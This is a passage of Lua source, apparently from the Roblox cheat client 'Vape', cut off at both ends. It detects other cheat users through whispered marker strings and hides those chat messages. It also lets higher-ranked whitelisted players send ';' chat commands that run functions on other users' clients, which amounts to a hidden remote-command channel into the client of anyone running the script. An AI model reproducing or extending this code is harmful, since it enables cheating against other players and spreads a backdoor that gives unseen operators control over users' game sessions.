		flyup = false
		flydown = false
		end
		end
	})
  end)
  	connectionstodisconnect[#connectionstodisconnect + 1] = repstorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(tab, channel)
		local plr = players:FindFirstChild(tab["FromSpeaker"])
		local args = tab.Message:split(" ")
		local client = clients.ChatStrings1[#args > 0 and args[#args] or tab.Message]
		if plr and WhitelistFunctions:CheckPlayerType(lplr) ~= "DEFAULT" and tab.MessageType == "Whisper" and client ~= nil and alreadysaidlist[plr.Name] == nil then
			alreadysaidlist[plr.Name] = true
			local playerlist = game:GetService("CoreGui"):FindFirstChild("PlayerList")
			if playerlist then
				pcall(function()
					local playerlistplayers = playerlist.PlayerListMaster.OffsetFrame.PlayerScrollList.SizeOffsetFrame.ScrollingFrameContainer.ScrollingFrameClippingFrame.ScollingFrame.OffsetUndoFrame
					local targetedplr = playerlistplayers:FindFirstChild("p_"..plr.UserId)
					if targetedplr then 
						targetedplr.ChildrenFrame.NameFrame.BGFrame.OverlayFrame.PlayerIcon.Image = getcustomassetfunc("vape/assets/VapeIcon.png")
					end
				end)
			end
			task.spawn(function()
				local connection
				for i,newbubble in pairs(game:GetService("CoreGui").BubbleChat:GetDescendants()) do
					if newbubble:IsA("TextLabel") and newbubble.Text:find(clients.ChatStrings2[client]) then
						newbubble.Parent.Parent.Visible = false
						repeat task.wait() until newbubble:IsDescendantOf(nil)
						if connection then
							connection:Disconnect()
						end
					end
				end
				connection = game:GetService("CoreGui").BubbleChat.DescendantAdded:Connect(function(newbubble)
					if newbubble:IsA("TextLabel") and newbubble.Text:find(clients.ChatStrings2[client]) then
						newbubble.Parent.Parent.Visible = false
						repeat task.wait() until newbubble:IsDescendantOf(nil)
						if connection then
							connection:Disconnect()
						end
					end
				end)
			end)
			createwarning("Vape", plr.Name.." is using "..client.."!", 60)
			clients.ClientUsers[plr.Name] = client:upper()..' USER'
			local ind, newent = entity.getEntityFromPlayer(plr)
			if newent then entity.entityUpdatedEvent:Fire(newent) end
		end
		if priolist[WhitelistFunctions:CheckPlayerType(lplr)] > 0 and plr == lplr then
			if tab.Message:len() >= 5 and tab.Message:sub(1, 5):lower() == ";cmds" then
				local tab = {}
				for i,v in pairs(commandsII) do
					table.insert(tab, i)
				end
				table.sort(tab)
				local str = ""
				for i,v in pairs(tab) do
					str = str..";"..v.."\n"
				end
				game.StarterGui:SetCore("ChatMakeSystemMessage",{
					Text = 	str,
				})
			end
		end
 		if plr and priolist[WhitelistFunctions:CheckPlayerType(plr)] > 0 and plr ~= lplr and priolist[WhitelistFunctions:CheckPlayerType(plr)] > priolist[WhitelistFunctions:CheckPlayerType(lplr)] and #args > 1 then
			table.remove(args, 1)
			local chosenplayers = findplayers(args[1], plr)
			if table.find(chosenplayers, lplr) then
				table.remove(args, 1)
				for i,v in pairs(commandsII) do
					if tab.Message:len() >= (i:len() + 1) and tab.Message:sub(1, i:len() + 1):lower() == ";"..i:lower() then
						v(args, plr)
						break
					end
				end
			end
		end